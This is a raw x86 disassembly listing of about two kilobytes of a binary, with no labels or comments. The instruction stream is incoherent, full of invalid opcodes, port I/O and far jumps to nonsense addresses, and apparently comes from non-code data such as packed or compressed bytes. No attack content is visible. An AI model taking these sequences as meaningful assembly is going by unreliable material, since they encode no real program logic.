  419c57:	mov    dh,0x57
  419c59:	enter  0x6e99,0xc7
  419c5d:	xchg   esi,eax
  419c5e:	sbb    BYTE PTR [eax-0x5f],dh
  419c61:	xchg   esi,eax
  419c62:	enter  0x1a74,0x28
  419c66:	push   ds
  419c67:	scas   al,BYTE PTR es:[edi]
  419c68:	ins    DWORD PTR es:[edi],dx
  419c69:	(bad)  
  419c6a:	(bad)  
  419c6c:	and    DWORD PTR [ecx-0x15],eax
  419c6f:	inc    ebp
  419c70:	adc    ah,BYTE PTR [ebx-0x68]
  419c73:	call   0x1ea0:0x9c85b9e0
  419c7a:	out    dx,eax
  419c7b:	aam    0x5c
  419c7d:	add    esi,DWORD PTR [edx-0x48]
  419c80:	jmp    0x97578ddc
  419c85:	aaa    
  419c86:	sbb    BYTE PTR [ebp+0x18],dl
  419c89:	rcr    BYTE PTR [ecx+edx*1-0x467f29d8],1
  419c90:	add    BYTE PTR [eax-0x7eba5330],cl
  419c96:	add    BYTE PTR [ebx-0xa],al
  419c99:	shl    ecx,1
  419c9b:	ret    
  419c9c:	mov    ah,0xa9
  419c9e:	or     eax,0x500a2c56
  419ca3:	cli    
  419ca4:	jbe    0x419cd7
  419ca6:	xlat   BYTE PTR ds:[ebx]
  419ca7:	call   0x1cef020b
  419cac:	shl    DWORD PTR [ecx],cl
  419cae:	pop    esp
  419caf:	dec    edi
  419cb0:	xchg   ecx,eax
  419cb1:	add    al,cl
  419cb3:	and    cl,BYTE PTR [ebx+0x45]
  419cb6:	xor    al,0xd0
  419cb8:	mov    DWORD PTR [eax+ebx*8-0x23],ebx
  419cbc:	xchg   ebp,eax
  419cbd:	mov    DWORD PTR [eax],0x2506d797
  419cc3:	pusha  
  419cc4:	push   edx
  419cc5:	mov    WORD PTR [ebx-0x22a2f0a0],ds
  419ccb:	js     0x419d00
  419ccd:	mov    edx,esi
  419ccf:	add    bh,ch
  419cd1:	call   0xb726c92c
  419cd6:	pop    eax
  419cd7:	jge    0x419d3d
  419cd9:	push   ebp
  419cdb:	cmp    ebp,esp
  419cdd:	adc    ah,BYTE PTR [esi]
  419cdf:	fcmovne st,st(4)
  419ce1:	mov    ebx,0x3d16ca99
  419ce6:	xor    edi,DWORD PTR [edx+0x17]
  419ce9:	dec    ecx
  419cea:	test   eax,0x893e437a
  419cef:	imul   ebx,edi,0xffffffdf
  419cf2:	jg     0x419cc7
  419cf4:	inc    esi
  419cf5:	fmul   st,st(0)
  419cf7:	aaa    
  419cf8:	mov    ah,BYTE PTR [eax]
  419cfa:	inc    esp
  419cfb:	and    DWORD PTR ds:0x3d96aae3,edi
  419d01:	addr16 and ah,dh
  419d04:	mov    BYTE PTR [ebp+0xa4c3679],bl
  419d0a:	cmp    eax,0xe5ffd6a1
  419d0f:	rol    esi,1
  419d11:	mov    gs,WORD PTR [ecx]
  419d13:	sbb    DWORD PTR [esi],edx
  419d15:	inc    ebp
  419d16:	mov    ds:0x8a9bf949,al
  419d1b:	adc    bl,ch
  419d1d:	add    ecx,edi
  419d1f:	shr    al,0x47
  419d22:	or     eax,0x623bf08d
  419d27:	hlt    
  419d28:	dec    esp
  419d29:	iret   
  419d2a:	popa   
  419d2b:	inc    ebx
  419d2c:	das    
  419d2d:	jmp    0xe266:0x7eb586c
  419d34:	std    
  419d35:	div    ch
  419d37:	xchg   ebp,eax
  419d38:	pop    esi
  419d39:	mov    ah,0x88
  419d3b:	cmp    cl,0xcf
  419d3e:	fdiv   QWORD PTR [edx+ecx*1-0x41392bcb]
  419d45:	inc    esp
  419d46:	dec    ebx
  419d47:	cld    
  419d48:	jno    0x419d23
  419d4a:	cmp    ah,al
  419d4c:	(bad)  
  419d4d:	in     eax,0x9f
  419d4f:	mov    cs,WORD PTR [edi+ebp*8-0x43]
  419d53:	pop    ds
  419d54:	adc    eax,0x1cc1bdc0
  419d59:	pop    es
  419d5a:	adc    eax,0x6a35d834
  419d5f:	sub    BYTE PTR [ebp-0x2ba1b0ec],dl
  419d65:	jbe    0x419dbc
  419d67:	retf   
  419d68:	mov    esp,DWORD PTR ds:[ecx]
  419d6b:	jno    0x419dd2
  419d6d:	hlt    
  419d6e:	push   ebx
  419d6f:	ror    DWORD PTR [ecx],1
  419d71:	or     eax,0xc3044e5b
  419d76:	fisttp DWORD PTR [eax-0x6d8f7d19]
  419d7c:	adc    edx,DWORD PTR [ecx+0x2414b343]
  419d82:	data16 clc 
  419d84:	out    0xb3,al
  419d86:	sub    bl,BYTE PTR [edi-0x18c847fe]
  419d8c:	test   eax,edx
  419d8e:	popf   
  419d8f:	jmp    0xfd4f4125
  419d94:	test   BYTE PTR [esp+eiz*4+0x51],dl
  419d98:	out    dx,eax
  419d99:	pmaddwd mm3,QWORD PTR [ecx-0x41]
  419d9d:	sar    BYTE PTR [ebx+0x4ce4471a],cl
  419da3:	or     eax,0x181e4b36
  419da8:	sbb    edx,ebp
  419daa:	and    BYTE PTR [ecx-0x52],dh
  419dad:	push   es
  419dae:	fstp   QWORD PTR [ecx-0x3ec6dbfe]
  419db4:	inc    ebp
  419db5:	js     0x419d87
  419db7:	bnd jo 0x419dd9
  419dba:	mov    al,0xa0
  419dbc:	fmul   QWORD PTR [ecx]
  419dbe:	rcr    BYTE PTR [edi-0x48df8fa3],0x58
  419dc5:	xchg   esi,eax
  419dc6:	in     al,0xa
  419dc8:	push   0x86e9fc96
  419dcd:	push   eax
  419dce:	retf   0x784e
  419dd1:	xchg   edx,eax
  419dd2:	inc    ah
  419dd4:	jno    0x419dac
  419dd6:	addr16 pop esp
  419dd8:	stos   DWORD PTR es:[edi],eax
  419dd9:	dec    esp
  419dda:	xchg   esp,eax
  419ddb:	jmp    0x419d78
  419ddd:	jne    0x419d78
  419ddf:	in     al,dx
  419de0:	out    0xf2,eax
  419de2:	lods   eax,DWORD PTR ds:[esi]
  419de3:	adc    edi,esp
  419de5:	mov    ah,0x2a
  419de7:	(bad)  
  419de8:	adc    bl,bh
  419dea:	xchg   edi,eax
  419deb:	or     BYTE PTR [ebx],0x6d
  419dee:	outs   dx,BYTE PTR ds:[esi]
  419def:	aam    0x27
  419df1:	aad    0x4a
  419df3:	rdtsc  
  419df5:	mov    edi,DWORD PTR [esi+ecx*4-0x2a6daf97]
  419dfc:	int3   
  419dfd:	out    0xa0,al
  419dff:	sti    
  419e00:	xor    BYTE PTR [ebx+eiz*1+0x48],bl
  419e04:	iret   
  419e05:	ja     0x419e71
  419e07:	sbb    bl,BYTE PTR [edi-0x7a541d56]
  419e0d:	sub    BYTE PTR [ecx+0x5f],bh
  419e10:	sub    cl,BYTE PTR [esi+0x7c]
  419e13:	sub    bl,bh
  419e15:	jmp    0x419e07
  419e17:	sub    esp,edi
  419e19:	fdivrp st(4),st
  419e1b:	scas   eax,DWORD PTR es:[edi]
  419e1c:	dec    esi
  419e1d:	pop    esi
  419e1e:	inc    esp
  419e1f:	je     0x419e38
  419e21:	(bad)
  419e26:	pop    es
  419e27:	dec    ebx
  419e28:	xchg   bh,dh
  419e2a:	out    0xca,al
  419e2c:	cld    
  419e2d:	out    dx,al
  419e2e:	push   ds
  419e2f:	push   ecx
  419e30:	mov    ah,0x7e
  419e32:	stos   BYTE PTR es:[edi],al
  419e33:	aam    0xc7
  419e35:	adc    BYTE PTR [edi+eax*4+0x73],dh
  419e39:	mov    ebp,0xcc7b0f7e
  419e3e:	jle    0x419e03
  419e40:	xor    dl,bl
  419e42:	mov    WORD PTR [esi+edx*1+0x32],?
  419e46:	mov    dl,0xa
  419e48:	lahf   
  419e49:	dec    edi
  419e4a:	mov    eax,0xe98780c5
  419e4f:	add    BYTE PTR [esi+0x2ab5a603],ah
  419e55:	sbb    al,0xfa
  419e57:	popf   
  419e58:	xchg   DWORD PTR [edx-0x3f],ebx
  419e5b:	gs mov bl,0x3f
  419e5e:	inc    eax
  419e5f:	aam    0x1e
  419e61:	xor    esp,0xbfc33963
  419e67:	push   0x5b86dc96
  419e6c:	xchg   ebx,eax
  419e6d:	outs   dx,DWORD PTR ds:[esi]
  419e6e:	dec    ebp
  419e6f:	inc    edx
  419e70:	cmp    bh,BYTE PTR [esi+0x4c106b6b]
  419e76:	gs fs stc 
  419e79:	hlt    
  419e7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e7b:	dec    eax
  419e7c:	repnz adc ah,BYTE PTR [edi+eax*1-0x7e]
  419e81:	dec    ebx
  419e82:	ror    BYTE PTR [ebp+0x150b8e76],cl
  419e88:	rcr    ebp,0xe0
  419e8b:	loope  0x419e15
  419e8d:	cmp    eax,0x54f74866
  419e92:	adc    al,0x20
  419e94:	lahf   
  419e95:	scas   eax,DWORD PTR es:[edi]
  419e96:	mov    ah,0x2f
  419e98:	repnz scas al,BYTE PTR es:[edi]
  419e9a:	pop    ebx
  419e9b:	dec    edx
  419e9c:	popf   
  419e9d:	lahf   
  419e9e:	or     DWORD PTR es:[ecx-0x14c5b59],edx
  419ea5:	aas    
  419ea6:	xchg   edi,eax
  419ea7:	je     0x419e46
  419ea9:	sub    ah,dl
  419eab:	loope  0x419eeb
  419ead:	or     eax,0xb42ba3e9
  419eb2:	cs jno 0x419f08
  419eb5:	into   
  419eb6:	(bad)  
  419eb7:	(bad)  
  419eb8:	and    BYTE PTR [edi],dl
  419eba:	push   ebp
  419ebb:	outs   dx,BYTE PTR ds:[esi]
  419ebc:	(bad)  
  419ebd:	test   DWORD PTR [ebx+0x3c],ecx
  419ec0:	cmp    esp,edx
  419ec2:	cmp    esp,ecx
  419ec4:	fadd   QWORD PTR [eax]
  419ec6:	rol    al,1
  419ec8:	pop    ss
  419ec9:	sar    DWORD PTR [edi],0xe7
  419ecc:	or     ebp,DWORD PTR [ecx]
  419ece:	cli    
  419ecf:	add    al,0x77
  419ed1:	and    ch,dh
  419ed3:	in     eax,dx
  419ed4:	sbb    edx,DWORD PTR [edi+edi*2]
  419ed7:	scas   al,BYTE PTR es:[edi]
  419ed8:	inc    esi
  419ed9:	push   eax
  419eda:	fcom   DWORD PTR [ecx+eax*8]
  419edd:	scas   al,BYTE PTR es:[edi]
  419ede:	sbb    eax,0x7c76f10e
  419ee3:	in     al,dx
  419ee4:	jmp    0x15f5:0x6a5c410b
  419eeb:	push   ss
  419eec:	push   0x21d857ea
  419ef1:	sub    ebx,DWORD PTR [eax]
  419ef3:	add    BYTE PTR [ecx],cl
  419ef5:	sahf   
  419ef6:	inc    esi
  419ef7:	pop    ebp
  419ef8:	(bad)  
  419ef9:	xchg   esi,eax
  419efa:	enter  0xd53c,0xbf
  419efe:	dec    eax
  419eff:	fsubrp st(3),st
  419f01:	lds    ebp,FWORD PTR [ecx]
  419f03:	push   0x6a
  419f05:	pop    esi
  419f06:	pop    esp
  419f07:	out    dx,al
  419f08:	aaa    
  419f09:	xchg   esp,eax
  419f0b:	xchg   ecx,eax
  419f0c:	aam    0xc4
  419f0e:	push   edx
  419f0f:	sub    al,0xd5
  419f11:	pop    edi
  419f12:	shr    DWORD PTR [ebx],0xde
  419f15:	fsubrp st(0),st
  419f17:	or     eax,0x944804b0
  419f1c:	neg    BYTE PTR [ebx]
  419f1e:	cmp    ecx,eax
  419f20:	scas   al,BYTE PTR es:[edi]
  419f21:	adc    BYTE PTR [ebp-0x44],dh
  419f24:	jns    0x419ec2
  419f26:	pop    esp
  419f27:	aam    0x5
  419f29:	mov    dh,BYTE PTR [eax]
  419f2b:	pop    esp
  419f2c:	xlat   BYTE PTR ds:[ebx]
  419f2d:	repnz push edi
  419f2f:	jbe    0x419ee8
  419f31:	sub    al,0xb1
  419f33:	shl    BYTE PTR [edi],0xa0
  419f36:	out    dx,eax
  419f37:	dec    eax
  419f38:	xor    dh,BYTE PTR [esi]
  419f3a:	jecxz  0x419f5f
  419f3c:	add    DWORD PTR [ecx-0x579fcacf],eax
  419f42:	and    BYTE PTR [ecx-0x2430de89],0xe4
  419f49:	xchg   esp,eax
  419f4a:	adc    eax,0x46441f3b
  419f4f:	fsub   DWORD PTR [ebp+ebx*1+0x53]
  419f53:	stos   BYTE PTR es:[edi],al
  419f54:	jl     0x419f5c
  419f56:	mov    ss,WORD PTR [edi]
  419f58:	jp     0x419f4f
  419f5a:	add    DWORD PTR [eax-0x287dba],edi
  419f60:	popf   
  419f61:	bound  edi,QWORD PTR [edi-0x221585f1]
  419f67:	inc    edi
  419f68:	loop   0x419f09
  419f6a:	lock push ss
  419f6c:	icebp  
  419f6d:	inc    ecx
  419f6e:	xor    ebx,DWORD PTR [ebp+0x6d]
  419f71:	mov    eax,ds:0x609e8728
  419f76:	sbb    al,0x82
  419f78:	mov    ebx,0xdafa0f75
  419f7d:	push   eax
  419f7e:	sub    DWORD PTR [esi],0x4d7ec84a
  419f84:	bswap  ebp
  419f86:	xor    BYTE PTR [ecx-0x73],bh
  419f89:	ds pop edx
  419f8b:	outs   dx,DWORD PTR ds:[esi]
  419f8c:	ficomp WORD PTR [edi+ebx*4]
  419f8f:	mov    ebx,0xb9618b10
  419f94:	or     al,0x12
  419f96:	adc    edx,ebp
  419f98:	add    al,0x89
  419f9a:	add    ecx,DWORD PTR [eax+0x3ab23df9]
  419fa0:	jecxz  0x419fae
  419fa2:	and    DWORD PTR [edi+eax*2-0x2f415aea],ebx
  419fa9:	hlt    
  419faa:	fsubr  QWORD PTR [eax-0x320525af]
  419fb0:	cli    
  419fb1:	cmp    esi,ecx
  419fb3:	push   eax
  419fb4:	push   ecx
  419fb5:	call   0x870d:0xbb2b6ff5
  419fbc:	dec    ebp
  419fbd:	dec    ecx
  419fbe:	jnp    0x41a018
  419fc0:	pavgb  mm4,mm2
  419fc3:	and    BYTE PTR [esi+0x48],dh
  419fc6:	push   esi
  419fc7:	push   0xffffffcb
  419fc9:	hlt    
  419fca:	icebp  
  419fcb:	xor    eax,DWORD PTR [ecx-0x39d90bc2]
  419fd1:	pop    ebp
  419fd2:	loopne 0x419fc2
  419fd4:	outs   dx,DWORD PTR ds:[esi]
  419fd5:	fmul   QWORD PTR [edx]
  419fd7:	sub    esi,ebp
  419fd9:	sbb    bh,BYTE PTR [edi-0x43b0d771]
  419fdf:	jo     0x41a024
  419fe1:	mov    al,0x36
  419fe3:	outs   dx,BYTE PTR ds:[esi]
  419fe4:	lds    edx,FWORD PTR [edi-0x5786708b]
  419fea:	mov    bl,cl
  419fec:	push   es
  419fed:	je     0x419f81
  419fef:	jp     0x41a032
  419ff1:	jecxz  0x419f8a
  419ff3:	and    al,0x37
  419ff5:	ja     0x419f77
  419ff7:	xchg   ecx,eax
  419ff8:	xlat   BYTE PTR ds:[ebx]
  419ff9:	sub    edi,DWORD PTR [ebp+0x17]
  419ffc:	mov    al,ds:0xa373519f
  41a001:	xor    eax,0x939012c4
  41a006:	adc    al,ah
  41a008:	and    eax,0xd7a55f3
  41a00d:	ss mov dh,0x51
  41a010:	cmc    
  41a011:	cld    
  41a012:	nop
  41a013:	and    edx,DWORD PTR [ecx+edi*1-0x550c20be]
  41a01a:	sti    
  41a01b:	idiv   BYTE PTR [edi+0x2c27183e]
  41a021:	push   es
  41a022:	jns    0x41a088
  41a024:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a025:	imul   ebx,DWORD PTR [eax+ebp*2-0x2c],0x5b
  41a02a:	out    0xfb,eax
  41a02c:	mov    ds:0xe8e12af0,eax
  41a031:	pop    esp
  41a032:	mov    ds:0x9b20d9e2,al
  41a037:	push   edi
  41a038:	mov    eax,ds:0x2676f8c0
  41a03d:	cld    
  41a03e:	xor    al,0x5b
  41a040:	ret    0xd6d6
  41a043:	cmp    ecx,DWORD PTR gs:[ecx-0x19]
  41a047:	(bad)  
  41a048:	call   0x155:0x4eebe42f
  41a04f:	fst    QWORD PTR [edx-0x3829197a]
  41a055:	fimul  DWORD PTR [esi-0x13]
  41a058:	adc    BYTE PTR [ebp-0x24],ah
  41a05b:	xor    DWORD PTR [ecx+0xb922e19],0x4cdffb38
  41a065:	jne    0x41a006
  41a067:	ror    DWORD PTR [ecx+0x6bd71c8e],cl
  41a06d:	out    dx,eax
  41a06e:	int    0x1d
  41a070:	cwde   
  41a071:	and    eax,esp
  41a073:	cmp    esi,DWORD PTR [ecx]
  41a075:	xchg   ebp,eax
  41a076:	cmp    al,0x4e
  41a078:	hlt    
  41a079:	mov    esp,0xebda96bf
  41a07e:	sar    edx,0xcf
  41a081:	test   al,0x89
  41a083:	push   ss
  41a084:	xchg   esi,eax
  41a085:	xchg   esp,eax
  41a086:	mov    ds:0xe924e709,al
  41a08b:	push   ds
  41a08c:	or     eax,0x9a274ac
  41a091:	in     eax,dx
  41a092:	adc    dh,dl
  41a094:	iret   
  41a095:	bound  esp,QWORD PTR [ebp+0x2d51aa12]
  41a09b:	push   ds
  41a09c:	addr16 jne 0x41a03b
  41a09f:	xchg   ebp,eax
  41a0a0:	lods   al,BYTE PTR ds:[esi]
  41a0a1:	push   ebp
  41a0a2:	sub    DWORD PTR [esi-0x479ea14f],esp
  41a0a8:	pop    ecx
  41a0a9:	ss push ecx
  41a0ab:	mov    ebx,0x4b5d050e
  41a0b0:	cld    
  41a0b1:	sbb    cl,BYTE PTR [edi-0x29b4e0b9]
  41a0b7:	push   ss
  41a0b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0b9:	sub    eax,0x85beee51
  41a0be:	jmp    FWORD PTR [edx+0x4b]
  41a0c1:	add    BYTE PTR [ebp+0x28],dl
  41a0c4:	push   ebp
  41a0c5:	dec    ebp
  41a0c6:	cmp    DWORD PTR [ebx-0x6bf7dc1],edi
  41a0cc:	adc    ah,cl
  41a0ce:	js     0x41a081
  41a0d0:	imul   eax,DWORD PTR ds:0x38b616e7,0xabc1a60e
  41a0da:	pop    ebx
  41a0db:	or     al,0xc
  41a0dd:	adc    al,0x7c
  41a0df:	jl     0x41a0a2
  41a0e1:	mov    al,ds:0xd1fc06bf
  41a0e6:	mov    edx,0xa583164c
  41a0eb:	mov    WORD PTR [eax+0x2],ss
  41a0ee:	xchg   BYTE PTR [ebp+edi*2+0x2b],dl
  41a0f2:	mov    al,ah
  41a0f4:	pop    es
  41a0f5:	xor    edi,esp
  41a0f7:	sahf   
  41a0f8:	cmp    al,BYTE PTR [ecx+ebp*8]
  41a0fb:	mov    al,ds:0xba6129d8
  41a100:	lea    ecx,[ebp+eax*8+0x2854a4c7]
  41a107:	loopne 0x41a134
  41a109:	pop    ebp
  41a10a:	mov    WORD PTR [esi+esi*8-0x7bcae17c],ss
  41a111:	dec    ecx
  41a112:	lods   eax,DWORD PTR ds:[esi]
  41a113:	mov    DWORD PTR [ebx+0x6a5a5b9],eax
  41a119:	sub    DWORD PTR [ebp+0x2ab678d0],ecx
  41a11f:	data16 ja 0x41a154
  41a122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a123:	mov    WORD PTR [ecx],ds
  41a125:	rcl    DWORD PTR [ebp-0x8],cl
  41a128:	pop    edi
  41a129:	retf   0xdd51
  41a12c:	inc    edi
  41a12d:	loop   0x41a0d8
  41a12f:	sbb    al,0x72
  41a131:	add    bl,0x75
  41a134:	pop    esp
  41a135:	xor    ebx,ebp
  41a137:	pop    ebx
  41a138:	xor    bh,BYTE PTR [ebx-0x26]
  41a13b:	retw   
  41a13d:	inc    esp
  41a13e:	pop    esi
  41a13f:	jle    0x41a137
  41a141:	inc    eax
  41a142:	sub    edx,DWORD PTR [edx+0x24]
  41a145:	sub    DWORD PTR [edi-0x67c41d7e],0xffffffad
  41a14c:	das    
  41a14d:	mov    ds:0x63f1e0de,al
  41a152:	das    
  41a153:	bound  esi,QWORD PTR es:[edx]
  41a156:	push   esi
  41a157:	add    dh,bl
  41a159:	(bad)  
  41a15a:	imul   esp,DWORD PTR [edi],0xfdf053ca
  41a160:	in     eax,0x58
  41a162:	sbb    al,0xb
  41a164:	dec    eax
  41a165:	mov    ah,0x60
  41a167:	es xchg esp,eax
  41a169:	and    eax,0x72387449
  41a16e:	jae    0x41a144
  41a170:	sbb    esp,DWORD PTR [edx-0x14]
  41a173:	and    DWORD PTR [esi+edx*1-0x46c234d1],0x3ff29582
  41a17e:	mov    dl,0xb4
  41a180:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a181:	xchg   ecx,eax
  41a182:	stos   DWORD PTR es:[edi],eax
  41a183:	call   0xcbe56706
  41a188:	pop    ecx
  41a189:	test   BYTE PTR [edi],0xb7
  41a18c:	lock ds add eax,0xfed50fdc
  41a193:	cmp    bl,ah
  41a195:	js     0x41a186
  41a197:	dec    esp
  41a198:	dec    edi
  41a199:	daa    
  41a19a:	mov    ch,BYTE PTR [eax]
  41a19c:	sub    edi,0xce7ab94c
  41a1a2:	mov    DWORD PTR [eax],0x7b3e18ca
  41a1a8:	dec    esp
  41a1a9:	imul   edi,DWORD PTR [ecx-0x6f],0x34
  41a1ad:	and    DWORD PTR [eax],eax
  41a1af:	sti    
  41a1b0:	imul   edx,DWORD PTR [ebx+eax*4-0x71],0xffffffc3
  41a1b5:	sub    eax,0x144fc68a
  41a1ba:	(bad)  
  41a1bb:	outs   dx,DWORD PTR ds:[esi]
  41a1bc:	fs test cl,al
  41a1bf:	cmp    BYTE PTR [ecx],al
  41a1c1:	(bad)  
  41a1c2:	jo     0x41a1eb
  41a1c4:	add    eax,0x74e6219f
  41a1c9:	sub    al,0x83
  41a1cb:	mov    dh,0x6b
  41a1cd:	popa   
  41a1ce:	and    BYTE PTR [esi+0x38e60c65],ch
  41a1d4:	sub    ch,dh
  41a1d6:	mov    es,ebp
  41a1d8:	xchg   edx,eax
  41a1d9:	sbb    DWORD PTR [edi+0x5c7c3ace],edx
  41a1df:	call   0x40614984
  41a1e4:	leave  
  41a1e5:	and    BYTE PTR [ebx+0x16],cl
  41a1e8:	add    dh,BYTE PTR [ebx]
  41a1ea:	test   BYTE PTR [edi-0x2b],cl
  41a1ed:	adc    al,0x31
  41a1ef:	push   eax
  41a1f0:	pop    ebp
  41a1f1:	retf   0x9769
  41a1f4:	or     al,BYTE PTR [edi-0x33bcdec6]
  41a1fa:	inc    eax
  41a1fb:	sub    BYTE PTR [edx+0x7d],al
  41a1fe:	and    eax,0xbeab90f1
  41a203:	data16 lahf 
  41a205:	push   esi
  41a206:	pop    ss
  41a207:	cmp    al,0xb6
  41a209:	push   es
  41a20a:	addr16 shr bh,0x8f
  41a20e:	mov    dl,0xd1
  41a210:	loop   0x41a22b
  41a212:	out    0x78,eax
  41a214:	(bad)  
  41a215:	jecxz  0x41a1d1
  41a217:	fucomip st,st(0)
  41a219:	pop    edi
  41a21a:	(bad)  
  41a21c:	rcr    ebx,0xb
  41a21f:	xor    eax,0xa8fc82d1
  41a224:	int    0x70
  41a226:	dec    ebx
  41a227:	sub    al,0x12
  41a229:	jmp    0x41a1f9
  41a22b:	mov    cl,0x48
  41a22d:	scas   al,BYTE PTR es:[edi]
  41a22e:	adc    esp,ebp
  41a230:	jmp    0x5199:0xd9046b8c
  41a237:	adc    dh,BYTE PTR [esi+0x21]
  41a23a:	adc    DWORD PTR [eax],ecx
  41a23c:	xchg   DWORD PTR [esi+0x77],ecx
  41a23f:	imul   edi,DWORD PTR [edi],0x24
  41a242:	imul   eax,DWORD PTR [ebp+0x2b],0x63f9463f
  41a249:	mov    ch,0x2d
  41a24b:	and    al,0x9c
  41a24d:	(bad)  
  41a24e:	sti    
  41a24f:	sub    BYTE PTR [esi],0x3b
  41a252:	aam    0x7f
  41a254:	jae    0x41a1e2
  41a256:	lahf   
  41a257:	xor    al,0xc1
  41a259:	sbb    esp,ecx
  41a25b:	js     0x41a21a
  41a25d:	xor    al,0xdc
  41a25f:	enter  0xe98e,0x83
  41a263:	mov    ecx,0x8808cd25
  41a268:	dec    ecx
  41a269:	ss leave 
  41a26b:	or     esp,DWORD PTR [ebp-0x9e06b5d]
  41a271:	inc    ebx
  41a272:	xchg   edx,eax
  41a273:	sbb    eax,0xc0120baa
  41a278:	inc    ebp
  41a279:	pusha  
  41a27a:	dec    ebx
  41a27b:	movaps xmm3,XMMWORD PTR [ecx-0x60]
  41a27f:	inc    eax
  41a280:	cmp    esi,DWORD PTR [edi]
  41a282:	sbb    DWORD PTR [eax-0x66],0xd4189ea3
  41a289:	pop    ss
  41a28a:	inc    eax
  41a28b:	xchg   ebx,eax
  41a28c:	xor    eax,0x193e1058
  41a291:	adc    BYTE PTR [edi],ch
  41a293:	clc    
  41a294:	repnz mov edx,DWORD PTR [ecx-0x1398d2f9]
  41a29b:	lods   eax,DWORD PTR ds:[esi]
  41a29c:	jl     0x41a2e2
  41a29e:	xor    al,0x75
  41a2a0:	mov    ecx,0xda19ff0a
  41a2a5:	test   eax,0x8e2455e3
  41a2aa:	xchg   ebp,eax
  41a2ab:	sbb    al,0xe5
  41a2ad:	adc    BYTE PTR [esi-0x169dd563],dh
  41a2b3:	xor    edx,DWORD PTR [esi+0x127e983f]
  41a2b9:	out    0xd5,eax
  41a2bb:	(bad)  
  41a2bc:	add    DWORD PTR [ebx+0x287d3a5a],0x1b
  41a2c3:	add    eax,0xc5e4679
  41a2c8:	or     BYTE PTR [ecx-0x20186e86],dh
  41a2ce:	xchg   DWORD PTR [ebx-0x64],edx
  41a2d1:	jmp    0x41a275
  41a2d3:	mov    ah,0x95
  41a2d5:	imul   eax,DWORD PTR [ebp+0x2d],0x71
  41a2d9:	push   ecx
  41a2da:	cli    
  41a2db:	sub    eax,0x6fdd56a6
  41a2e0:	mov    esi,0x6ebd8274
  41a2e5:	int3   
  41a2e6:	cmp    eax,0xf5060e05
  41a2eb:	lahf   
  41a2ec:	test   BYTE PTR [ebx],dl
  41a2ee:	mov    ebp,0x4dec0ca6
  41a2f3:	inc    esi
  41a2f4:	jb     0x41a306
  41a2f6:	fwait
  41a2f7:	pop    edx
  41a2f8:	cmp    dh,BYTE PTR [ebx+0x65]
  41a2fb:	lods   al,BYTE PTR ds:[esi]
  41a2fc:	push   0x76
  41a2fe:	into   
  41a2ff:	out    0x39,eax
  41a301:	inc    esp
  41a302:	scas   al,BYTE PTR es:[edi]
  41a303:	adc    ecx,eax
  41a305:	fwait
  41a306:	jmp    0x41a29c
  41a308:	shl    BYTE PTR [esi-0x1039cc1e],0x20
  41a30f:	sub    bh,dh
  41a311:	ficomp WORD PTR ds:0xc2271c36
  41a317:	lea    edi,[eax]
  41a319:	jno    0x41a33f
  41a31b:	out    0x65,al
  41a31d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a31e:	mov    eax,ds:0x4a3cbeb3
  41a323:	les    ebx,FWORD PTR [eax-0x1b6fc424]
  41a329:	inc    esp
  41a32a:	pop    ds
  41a32b:	fmul   DWORD PTR ds:0x2ecc773e
  41a331:	jge    0x41a2ff
  41a333:	test   al,0x9c
  41a335:	nop
  41a336:	inc    ecx
  41a337:	push   eax
  41a338:	nop
  41a339:	sub    eax,0xa524dc58
  41a33e:	and    DWORD PTR ds:[ecx+0x5b14dce1],edx
  41a345:	(bad)  
  41a346:	repz xor dh,BYTE PTR [ebx-0x7]
  41a34a:	sub    ah,BYTE PTR [eax+0x6e]
  41a34d:	dec    ecx
  41a34e:	xchg   ebx,eax
  41a34f:	stos   DWORD PTR es:[edi],eax
  41a350:	add    al,0xc1
  41a352:	dec    esp
  41a353:	cld    
  41a354:	sub    DWORD PTR [esi],ecx
  41a356:	mov    dl,dh
  41a358:	(bad)  
  41a35a:	mov    ch,BYTE PTR [esi+0x3e]
  41a35d:	or     ecx,DWORD PTR [esi+eax*4-0x44cac077]
  41a364:	arpl   WORD PTR [ecx-0x70bec3f7],sp
  41a36a:	(bad)  
  41a36b:	fidiv  DWORD PTR [ebp+ebp*8-0x6e]
  41a36f:	pop    esi
  41a370:	sbb    DWORD PTR [ebp+0x53],ebx
  41a373:	add    ah,BYTE PTR [esi+0x1c]
  41a376:	dec    edi
  41a377:	retf   0xa5e3
  41a37a:	add    cl,dh
  41a37c:	mov    dl,0x5
  41a37e:	and    DWORD PTR [ebx],ebx
  41a380:	std    
  41a381:	push   ds
  41a382:	sti    
  41a383:	sub    bh,ah
  41a385:	and    DWORD PTR [ebx],edi
  41a387:	dec    esp
  41a388:	mov    edx,0x42d04194
  41a38d:	cdq    
  41a38e:	dec    eax
  41a38f:	jecxz  0x41a37f
  41a391:	mov    ds:0x33a256a6,al
  41a396:	xor    ah,BYTE PTR [ebp-0x2ded2e12]
  41a39c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a39d:	lea    eax,[edx-0x5b]
  41a3a0:	repz push es
  41a3a2:	popa   
  41a3a3:	call   0x619d:0x88b299e1
  41a3aa:	outs   dx,BYTE PTR ds:[esi]
  41a3ab:	xchg   edi,eax
  41a3ac:	aam    0x85
  41a3ae:	jge    0x41a3cc
  41a3b0:	ret    0x5a5c
  41a3b3:	and    ebx,ebp
  41a3b5:	add    al,0x40
  41a3b7:	pop    es
  41a3b8:	sub    ebx,DWORD PTR [edx+0x6a]
  41a3bb:	outs   dx,DWORD PTR ds:[esi]
  41a3bc:	mov    ds:0x24d8cefe,eax
  41a3c1:	std    
  41a3c2:	retf   
  41a3c3:	inc    edx
  41a3c4:	or     al,dh
  41a3c6:	fs xchg edi,eax
  41a3c8:	mov    al,ds:0x56703c7e
  41a3cd:	xchg   esi,eax
  41a3ce:	and    cl,cl
  41a3d0:	lds    ebp,FWORD PTR [edi]
  41a3d2:	and    DWORD PTR [edx],ebx
  41a3d4:	mov    edx,0xeeba6fd1
  41a3d9:	hlt    
  41a3da:	mov    dl,0x19
  41a3dc:	mov    edx,0x8e4f1
  41a3e1:	je     0x41a441
  41a3e3:	sub    dl,BYTE PTR [edx]
  41a3e5:	add    eax,0xa1ce9b9b
  41a3ea:	push   es
  41a3eb:	add    eax,0x814aacbd
